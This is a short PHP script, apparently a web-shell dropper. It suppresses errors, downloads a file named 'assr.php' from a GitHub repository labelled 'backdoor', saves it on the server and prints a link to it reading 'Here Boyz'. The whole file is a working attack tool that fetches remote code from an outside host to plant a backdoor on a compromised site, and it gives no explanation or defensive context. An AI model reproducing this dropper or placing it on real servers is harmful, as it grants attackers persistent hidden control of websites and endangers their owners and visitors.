<?php
error_reporting(0);
$shell = fopen("assr.php", "w");
$file_shell = file_get_contents("https://raw.githubusercontent.com/kakaroot1337/backdoor/main/assr.php");
fwrite($shell, $file_shell);
fclose($shell);
echo "<a href='assr.php'>Here Boyz</a>";
?>
